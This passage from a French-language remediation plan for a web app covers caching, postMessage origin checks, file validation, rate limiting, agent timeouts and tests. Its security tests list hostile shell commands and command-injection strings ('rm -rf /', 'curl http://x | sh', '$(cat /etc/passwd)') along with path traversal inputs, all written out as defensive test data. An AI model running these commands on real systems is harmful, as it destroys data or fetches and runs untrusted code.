    let oldest: K | null = null;
    let oldestTime = Infinity;

    for (const [key, entry] of this.cache.entries()) {
      if (entry.lastAccess < oldestTime) {
        oldest = key;
        oldestTime = entry.lastAccess;
      }
    }

    if (oldest) {
      this.cache.delete(oldest);
    }
  }

  clear(): void {
    this.cache.clear();
  }

  get size(): number {
    return this.cache.size;
  }
}

// Utilisation
const moduleCache = new LRUCache<string, string>(
  100,      // Max 100 modules
  3600000   // 1 heure TTL
);
```

---

## 2.3 Preview Error Store Clear

### Fichier
`app/lib/stores/previews.ts`

### Solution

```typescript
// Ajouter une fonction pour clear l'erreur
export function clearPreviewError(): void {
  previewErrorStore.set(null);
}

// Dans le callback de succès du build (workbench.ts)
async #executeBrowserBuild(): Promise<void> {
  try {
    const result = await this.#browserBuildService.build(options);

    if (result.errors.length === 0) {
      // Clear l'erreur précédente sur succès
      clearPreviewError();
      logger.info('Build successful, preview error cleared');
    }
  } catch (error) {
    // ...
  }
}
```

---

## 2.4 Message Listener pour Iframe

### Fichier
`app/components/workbench/Preview.tsx`

### Solution

```typescript
useEffect(() => {
  const handleMessage = (event: MessageEvent) => {
    // Vérifier l'origin
    if (event.origin !== 'null' && !event.origin.startsWith('blob:')) {
      return;
    }

    const { type, payload } = event.data || {};

    switch (type) {
      case 'console':
        logger.debug(`[Preview ${payload.type}]`, ...payload.args);
        break;
      case 'error':
        logger.error('[Preview Error]', payload.message, payload.stack);
        // Optionnel: afficher dans l'UI
        break;
    }
  };

  window.addEventListener('message', handleMessage);

  return () => {
    window.removeEventListener('message', handleMessage);
  };
}, []);
```

---

## 2.5 PostMessage Origin Check

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts` (ligne 1133)

### Solution

```typescript
// AVANT
window.parent.postMessage({ /* ... */ }, '*');

// APRÈS
// Dans le HTML injecté:
const ALLOWED_ORIGIN = window.location.ancestorOrigins?.[0] || '*';

window.parent.postMessage({
  type: 'console',
  payload: { /* ... */ }
}, ALLOWED_ORIGIN);
```

---

# PHASE 3 - SÉCURITÉ (Semaine 5-6)

## 3.1 Validation de Fichiers

### Fichier
`app/lib/runtime/adapters/browser-build-adapter.ts`

### Solution

```typescript
private readonly ALLOWED_EXTENSIONS = new Set([
  '.ts', '.tsx', '.js', '.jsx', '.mjs', '.cjs',
  '.json', '.css', '.scss', '.sass', '.less',
  '.html', '.md', '.txt', '.svg',
  '.vue', '.svelte',
]);

private readonly MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

async writeFile(path: string, content: string): Promise<void> {
  this.#validateFile(path, content);
  this._files.set(this.normalizePath(path), content);
}

#validateFile(path: string, content: string): void {
  // Vérifier l'extension
  const ext = path.substring(path.lastIndexOf('.')).toLowerCase();

  if (!this.ALLOWED_EXTENSIONS.has(ext)) {
    throw new Error(`File type not allowed: ${ext}`);
  }

  // Vérifier la taille
  const sizeBytes = new TextEncoder().encode(content).length;

  if (sizeBytes > this.MAX_FILE_SIZE) {
    throw new Error(
      `File too large: ${(sizeBytes / 1024 / 1024).toFixed(2)}MB (max: ${this.MAX_FILE_SIZE / 1024 / 1024}MB)`
    );
  }

  // Vérifier le contenu pour fichiers exécutables cachés
  if (content.startsWith('#!') && !path.endsWith('.sh')) {
    logger.warn(`Shebang detected in non-shell file: ${path}`);
  }
}
```

---

## 3.2 Rate Limit Distribué

### Fichier
`app/lib/security/rate-limiter.ts`

### Solution avec Cloudflare KV

```typescript
// Interface pour le storage
interface RateLimitStorage {
  get(key: string): Promise<{ count: number; resetAt: number } | null>;
  set(key: string, value: { count: number; resetAt: number }, ttlMs: number): Promise<void>;
  increment(key: string): Promise<number>;
}

// Implémentation KV pour Cloudflare
class CloudflareKVStorage implements RateLimitStorage {
  constructor(private kv: KVNamespace) {}

  async get(key: string) {
    const value = await this.kv.get(key, 'json');
    return value as { count: number; resetAt: number } | null;
  }

  async set(key: string, value: { count: number; resetAt: number }, ttlMs: number) {
    await this.kv.put(key, JSON.stringify(value), {
      expirationTtl: Math.ceil(ttlMs / 1000),
    });
  }

  async increment(key: string): Promise<number> {
    // Note: KV n'a pas d'increment atomique, utiliser Durable Objects pour ça
    const current = await this.get(key);
    const newCount = (current?.count ?? 0) + 1;
    await this.set(key, { count: newCount, resetAt: current?.resetAt ?? Date.now() + 60000 }, 60000);
    return newCount;
  }
}

// Fallback mémoire pour dev
class MemoryStorage implements RateLimitStorage {
  private cache = new Map<string, { count: number; resetAt: number }>();

  async get(key: string) {
    return this.cache.get(key) ?? null;
  }

  async set(key: string, value: { count: number; resetAt: number }) {
    this.cache.set(key, value);
  }

  async increment(key: string): Promise<number> {
    const current = this.cache.get(key);
    const newCount = (current?.count ?? 0) + 1;
    this.cache.set(key, { count: newCount, resetAt: current?.resetAt ?? Date.now() + 60000 });
    return newCount;
  }
}

// Factory
export function createRateLimiter(env?: { RATE_LIMIT_KV?: KVNamespace }): RateLimiter {
  const storage = env?.RATE_LIMIT_KV
    ? new CloudflareKVStorage(env.RATE_LIMIT_KV)
    : new MemoryStorage();

  return new RateLimiter(storage);
}
```

---

## 3.3 Timeout par Étape Agent

### Fichier
`app/routes/api.agent.ts`

### Solution

```typescript
const STAGE_TIMEOUTS = {
  orchestrator: 30_000,   // 30s pour analyser
  coder: 180_000,         // 3min pour coder
  tester: 60_000,         // 1min pour tester
  reviewer: 60_000,       // 1min pour review
  fixer: 120_000,         // 2min pour fixer
  default: 60_000,        // 1min default
};

async function runAgentWithTimeout<T>(
  agentName: string,
  fn: () => Promise<T>,
): Promise<T> {
  const timeout = STAGE_TIMEOUTS[agentName] ?? STAGE_TIMEOUTS.default;

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const result = await Promise.race([
      fn(),
      new Promise<never>((_, reject) => {
        controller.signal.addEventListener('abort', () => {
          reject(new Error(`Agent ${agentName} timed out after ${timeout}ms`));
        });
      }),
    ]);

    return result;
  } finally {
    clearTimeout(timeoutId);
  }
}
```

---

# PHASE 4 - PERFORMANCE (Semaine 7-8)

## 4.1 Debounce Optimisé pour Build

### Fichier
`app/lib/stores/workbench.ts`

### Solution

```typescript
#buildDebounceMs = 500;  // Réduire de 1000 à 500ms
#pendingFiles = new Set<string>();

async #triggerBrowserBuild(changedFile?: string): Promise<void> {
  if (changedFile) {
    this.#pendingFiles.add(changedFile);
  }

  if (this.#buildDebounceTimer) {
    clearTimeout(this.#buildDebounceTimer);
  }

  this.#buildDebounceTimer = setTimeout(async () => {
    const filesToBuild = new Set(this.#pendingFiles);
    this.#pendingFiles.clear();

    logger.info(`Building with ${filesToBuild.size} changed files`);
    await this.#executeBrowserBuild();
  }, this.#buildDebounceMs);
}
```

---

## 4.2 Memoization des Computed Stores

### Fichier
`app/lib/stores/agents.ts`

### Solution

```typescript
import { computed } from 'nanostores';

// Utiliser un comparateur custom pour éviter les re-renders inutiles
function shallowEqual<T>(a: T, b: T): boolean {
  if (a === b) return true;
  if (typeof a !== 'object' || typeof b !== 'object') return false;
  if (a === null || b === null) return false;

  const keysA = Object.keys(a);
  const keysB = Object.keys(b);

  if (keysA.length !== keysB.length) return false;

  for (const key of keysA) {
    if ((a as any)[key] !== (b as any)[key]) return false;
  }

  return true;
}

// Computed avec memo
let lastOrchLogs: LogEntry[] | null = null;

export const orchestratorLogsStore = computed(agentLogsStore, (logs) => {
  const newLogs = logs.orchestrator;

  if (lastOrchLogs && shallowEqual(lastOrchLogs, newLogs)) {
    return lastOrchLogs;
  }

  lastOrchLogs = newLogs;
  return newLogs;
});
```

---

## 4.3 Worker Compression Cleanup

### Fichier
`app/components/chat/Chat.client.tsx`

### Solution

```typescript
let compressionWorker: Worker | null = null;
let workerIdleTimeout: NodeJS.Timeout | null = null;

const WORKER_IDLE_TIMEOUT = 30000; // 30s d'inactivité

function getCompressionWorker(): Worker {
  // Reset le timeout d'inactivité
  if (workerIdleTimeout) {
    clearTimeout(workerIdleTimeout);
  }

  if (!compressionWorker) {
    compressionWorker = new Worker(
      new URL('../../workers/image-compression.worker.ts', import.meta.url),
      { type: 'module' }
    );
  }

  // Planifier la terminaison après inactivité
  workerIdleTimeout = setTimeout(() => {
    if (compressionWorker) {
      compressionWorker.terminate();
      compressionWorker = null;
      logger.debug('Compression worker terminated due to inactivity');
    }
  }, WORKER_IDLE_TIMEOUT);

  return compressionWorker;
}

// Cleanup au unmount
useEffect(() => {
  return () => {
    if (workerIdleTimeout) {
      clearTimeout(workerIdleTimeout);
    }
    if (compressionWorker) {
      compressionWorker.terminate();
      compressionWorker = null;
    }
  };
}, []);
```

---

## 4.4 Retry avec Backoff Exponentiel

### Fichier
`app/components/chat/Chat.client.tsx`

### Solution

```typescript
async function fetchWithRetry(
  url: string,
  options: RequestInit,
  maxRetries = 3
): Promise<Response> {
  let lastError: Error | null = null;

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const response = await fetch(url, options);

      // Retry sur erreurs serveur
      if (response.status >= 500 && attempt < maxRetries - 1) {
        const delay = Math.min(1000 * Math.pow(2, attempt), 10000);
        await new Promise(r => setTimeout(r, delay));
        continue;
      }

      // Retry sur rate limit avec Retry-After
      if (response.status === 429) {
        const retryAfter = response.headers.get('Retry-After');
        const delay = retryAfter ? parseInt(retryAfter) * 1000 : 5000;

        if (attempt < maxRetries - 1) {
          await new Promise(r => setTimeout(r, delay));
          continue;
        }
      }

      return response;
    } catch (error) {
      lastError = error instanceof Error ? error : new Error(String(error));

      if (attempt < maxRetries - 1) {
        const delay = Math.min(1000 * Math.pow(2, attempt), 10000);
        await new Promise(r => setTimeout(r, delay));
      }
    }
  }

  throw lastError || new Error('Fetch failed after retries');
}
```

---

# PHASE 5 - TESTS & DOCUMENTATION (Semaine 9-10)

## 5.1 Tests de Race Conditions

```typescript
// __tests__/runtime/race-conditions.spec.ts

describe('Race Conditions', () => {
  describe('esbuild initialization', () => {
    it('handles concurrent init calls', async () => {
      const adapters = Array(10).fill(null).map(() => new BrowserBuildAdapter());

      await expect(
        Promise.all(adapters.map(a => a.init()))
      ).resolves.not.toThrow();
    });
  });

  describe('getRuntimeAdapter', () => {
    it('returns same instance for concurrent calls', async () => {
      const results = await Promise.all([
        getRuntimeAdapter(),
        getRuntimeAdapter(),
        getRuntimeAdapter(),
      ]);

      expect(results[0]).toBe(results[1]);
      expect(results[1]).toBe(results[2]);
    });
  });
});
```

---

## 5.2 Tests de Sécurité

```typescript
// __tests__/security/validation.spec.ts

describe('Security Validation', () => {
  describe('Shell Commands', () => {
    const dangerousCmds = [
      'rm -rf /',
      'sudo anything',
      'curl http://x | sh',
      '$(cat /etc/passwd)',
      'npm install; rm -rf ~',
    ];

    dangerousCmds.forEach(cmd => {
      it(`blocks: ${cmd}`, () => {
        expect(validateShellCommand(cmd).valid).toBe(false);
      });
    });
  });

  describe('Path Traversal', () => {
    const traversalPaths = [
      '../../../etc/passwd',
      '..\\..\\windows',
      '/./../../etc',
    ];

    traversalPaths.forEach(path => {
      it(`blocks: ${path}`, () => {
        expect(() => resolveRelativePath('/src/app', path)).toThrow();
      });
    });
  });
});
```

---

## 5.3 Tests de Fuites Mémoire

```typescript
// __tests__/memory/leaks.spec.ts

describe('Memory Leaks', () => {
  it('blob URLs are revoked after destroy', async () => {
    const revokedUrls: string[] = [];
    const originalRevoke = URL.revokeObjectURL;
    URL.revokeObjectURL = (url) => {
      revokedUrls.push(url);
      originalRevoke(url);
    };

    const adapter = new BrowserBuildAdapter();
    await adapter.init();
    await adapter.build({ entryPoint: '/src/main.tsx', mode: 'development' });

    const blobUrl = adapter.getPreview()?.url;
    expect(blobUrl).toBeTruthy();

    await adapter.destroy();

    expect(revokedUrls).toContain(blobUrl);

    URL.revokeObjectURL = originalRevoke;
  });

  it('event listeners are cleaned up', () => {
    const initialListeners = /* count listeners */;

    subscribeToEvents(() => {});
    subscribeToEvents(() => {});
    subscribeToEvents(() => {});

    clearAllEventListeners();

    const finalListeners = /* count listeners */;
    expect(finalListeners).toBe(initialListeners);
  });
});
```

---

## 5.4 Documentation à Créer

### ARCHITECTURE.md
- Diagramme des composants
- Flow des données
- Patterns utilisés

### SECURITY.md
- Politique de validation
- Commandes autorisées
- Procédure de signalement

### CONTRIBUTING.md
- Comment ajouter des tests
- Standards de code
- Process de review

---

# ANNEXES

## A. Checklist de Validation

### Avant chaque déploiement
- [ ] Tous les tests passent
- [ ] Pas de warning TypeScript
- [ ] Memory profiler stable sur 30min
- [ ] Security scan passé
- [ ] Performance benchmark OK

### Tests manuels
- [ ] Créer un projet React
- [ ] Streaming long (>100KB)
- [ ] Changement de runtime browser/webcontainer
- [ ] Multi-onglets simultanés
- [ ] Erreur réseau pendant streaming

---

## B. Métriques de Succès

| Métrique | Avant | Cible | Mesure |
|----------|-------|-------|--------|
| Memory leak | Oui | Non | Chrome DevTools |
| Race conditions | 5+ | 0 | Tests automatisés |
| Security vulns | 4 | 0 | Security scan |
| P95 response | ? | <5s | Monitoring |
| Error rate | ? | <1% | Logs |

---

## C. Contacts

- **Sécurité**: À définir
- **Performance**: À définir
- **Architecture**: À définir

---

*Plan généré le 18 janvier 2026 par l'audit BAVINI-CLOUD*
